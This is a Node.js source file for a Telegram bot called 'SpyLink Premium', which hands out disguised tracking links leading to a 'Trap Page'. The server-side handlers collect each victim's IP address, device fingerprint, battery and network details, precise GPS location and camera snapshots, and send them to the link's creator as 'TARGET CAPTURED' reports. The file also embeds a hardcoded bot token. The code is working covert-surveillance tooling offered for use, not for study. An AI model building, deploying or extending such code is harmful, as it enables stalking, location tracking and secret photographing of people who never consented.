const express = require("express");
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');
const UAParser = require('ua-parser-js');

// 🔐 CONFIGURATION
const BOT_TOKEN = "8377073485:AAG2selNlxyHeZ3_2wjMGdG_QshklCiTAyE";
const ADMIN_ID = 8175884349; // 👑 YOU (The Only Admin)
const HOST_URL = "https://botu-s3f9.onrender.com"; 

// STATE
let maintenanceMode = false; // Default: Online
let sessions = {};
let users = new Set([ADMIN_ID]);

// INITIALIZE
const app = express();
app.use(require('helmet')({ contentSecurityPolicy: false }));
app.use(require('cors')());
app.use(require('morgan')('dev'));
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.set("view engine", "ejs");
app.use(express.static("public"));

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
bot.deleteWebHook().then(() => console.log("✅ Polling Started"));

// ==================== 🛡️ SECURITY MIDDLEWARE ====================

// Helper: Check if user is Admin
const isAdmin = (id) => String(id) === String(ADMIN_ID);

// Helper: Enforce Maintenance Mode
const checkAccess = (msg) => {
    const chatId = msg.chat.id;
    
    // 1. If Admin -> ALWAYS ALLOW
    if (isAdmin(chatId)) return true;

    // 2. If Maintenance is ON -> BLOCK USER
    if (maintenanceMode) {
        bot.sendMessage(chatId, `
⛔ *SYSTEM PAUSED*

The bot is currently under maintenance or stopped by the administrator.
Please try again later.

👨‍💻 Support: @aadi_io
        `, { parse_mode: "Markdown" });
        return false;
    }

    // 3. Normal User -> ALLOW
    return true;
};

// ==================== 🤖 BOT COMMANDS ====================

// 1. Start Command (Premium UI)
bot.onText(/\/start/, (msg) => {
    if (!checkAccess(msg)) return;
    const chatId = msg.chat.id;
    users.add(chatId);

    const keyboard = {
        inline_keyboard: [
            [{ text: "🔗 Create Tracking Link", callback_data: "create" }],
            [{ text: "📡 Server Status", callback_data: "status" }]
        ]
    };

    // Admin gets extra buttons
    if (isAdmin(chatId)) {
        keyboard.inline_keyboard.push([{ text: "🔐 Admin Panel", callback_data: "admin" }]);
    }

    bot.sendMessage(chatId, `
🛡️ *SpyLink Premium v3.0*

👋 Welcome, *${msg.from.first_name}*.
Advanced IP Logging & Device Forensics Tool.

🟢 *System:* Online
📡 *Mode:* ${maintenanceMode ? "🔴 Maintenance" : "✅ Live"}

_Choose an option below:_
    `, { parse_mode: "Markdown", reply_markup: keyboard });
});

// 2. Admin Controls (/on & /off)
bot.onText(/\/on/, (msg) => {
    if (!isAdmin(msg.chat.id)) return;
    maintenanceMode = false;
    bot.sendMessage(msg.chat.id, "🟢 *SYSTEM ONLINE*\nBot is now visible to all users.", { parse_mode: "Markdown" });
});

bot.onText(/\/off/, (msg) => {
    if (!isAdmin(msg.chat.id)) return;
    maintenanceMode = true;
    bot.sendMessage(msg.chat.id, "🔴 *MAINTENANCE MODE ENABLED*\nBot is hidden from public. You can still use it.", { parse_mode: "Markdown" });
});

// 3. Create Link Handler
bot.on('callback_query', async (q) => {
    const chatId = q.message.chat.id;
    const data = q.data;

    // Maintenance Check for Buttons
    if (!checkAccess(q.message)) return;

    if (data === "create") {
        const sessionId = uuidv4();
        sessions[sessionId] = { chatId, createdAt: new Date() };
        const target = Buffer.from("https://google.com").toString('base64');
        const link = `${HOST_URL}/verify/${sessionId}/${target}`;

        bot.sendMessage(chatId, `
💎 *SESSION GENERATED*

🆔 \`${sessionId}\`
🔗 *Link:* \`${link}\`

_Features:_
• 📸 Camera Burst (4x)
• 📍 Precise GPS
• 📱 Full Device Fingerprint
        `, { parse_mode: "Markdown" });
    }

    if (data === "status") {
        const statusMsg = `
📊 *SERVER METRICS*

⏱️ Uptime: ${Math.floor(process.uptime())}s
👥 Users: ${users.size}
🛡️ Maintenance: ${maintenanceMode ? "ON" : "OFF"}
💾 Memory: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
        `;
        bot.answerCallbackQuery(q.id, { text: "System Healthy" });
        bot.sendMessage(chatId, statusMsg, { parse_mode: "Markdown" });
    }

    if (data === "admin") {
        if (!isAdmin(chatId)) return bot.answerCallbackQuery(q.id, { text: "⚠️ Access Denied", show_alert: true });
        
        bot.sendMessage(chatId, `
🔐 *ADMIN DASHBOARD*

🔹 /on - Enable Public Access
🔹 /off - Enable Maintenance Mode
🔹 /broadcast [msg] - Send Alert
        `, { parse_mode: "Markdown" });
    }
});

// 4. Broadcast
bot.onText(/\/broadcast (.+)/, async (msg, match) => {
    if (!isAdmin(msg.chat.id)) return;
    const text = match[1];
    bot.sendMessage(msg.chat.id, `📣 Sending to ${users.size} users...`);
    
    for (let id of users) {
        try { await bot.sendMessage(id, text, { parse_mode: "Markdown" }); } catch (e) {}
        await new Promise(r => setTimeout(r, 50));
    }
    bot.sendMessage(msg.chat.id, "✅ Broadcast Complete.");
});

// ==================== 🌐 WEB HANDLERS ====================

// Root
app.get("/", (req, res) => {
    res.send(`<h1 style="text-align:center;font-family:sans-serif;margin-top:50px">🟢 System Active</h1>`);
});

// Trap Page
app.get("/verify/:id/:url", (req, res) => {
    const { id, url } = req.params;
    if (!sessions[id]) sessions[id] = { chatId: ADMIN_ID };
    
    let finalUrl = "https://google.com";
    try { finalUrl = Buffer.from(url, 'base64').toString('utf-8'); } catch(e) {}

    // Load the Premium EJS
    res.render("diagnostics", { uid: id, url: finalUrl, host: HOST_URL });
});

// Data Receiver
app.post("/report", async (req, res) => {
    const { uid, data } = req.body;
    if (!sessions[uid]) return res.json({ error: "No session" });

    const chatId = sessions[uid].chatId;
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    const ua = new UAParser(data.device.userAgent);

    const report = `
🎯 *TARGET CAPTURED*

👤 *IDENTITY*
• IP: \`${ip}\`
• OS: ${ua.getOS().name} ${ua.getOS().version}
• Browser: ${ua.getBrowser().name}
• Device: ${ua.getDevice().vendor || "Generic"} ${ua.getDevice().model || "PC"}

⚡ *STATUS*
• Battery: ${data.battery.level}% ${data.battery.charging ? "⚡" : ""}
• Network: ${data.network.type}
• Storage: ${data.storage.used}MB / ${data.storage.quota}MB

📍 *GPS Data incoming...*
    `;

    bot.sendMessage(chatId, report, { parse_mode: "Markdown" });
    res.json({ status: "ok" });
});

// Location Receiver
app.post("/location", (req, res) => {
    const { uid, lat, lon, acc } = req.body;
    if (sessions[uid]) {
        const chatId = sessions[uid].chatId;
        const map = `https://www.google.com/maps?q=${lat},${lon}`;
        bot.sendMessage(chatId, `📍 *GPS LOCKED* (±${acc}m)\n🔗 [View on Map](${map})`, { parse_mode: "Markdown" });
        bot.sendLocation(chatId, lat, lon);
    }
    res.json({ status: "ok" });
});

// Cam Receiver
app.post("/cam", (req, res) => {
    const { uid, img } = req.body;
    if (sessions[uid] && img) {
        const buff = Buffer.from(img.replace(/^data:image\/png;base64,/, ""), 'base64');
        bot.sendPhoto(sessions[uid].chatId, buff, { caption: "📸 *Evidence*" });
    }
    res.json({ status: "ok" });
});

// Server Start
app.get("/keepalive", (req, res) => res.sendStatus(200));
setInterval(() => axios.get(`${HOST_URL}/keepalive`).catch(() => {}), 45000);

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`✅ Premium Server Active on ${PORT}`));
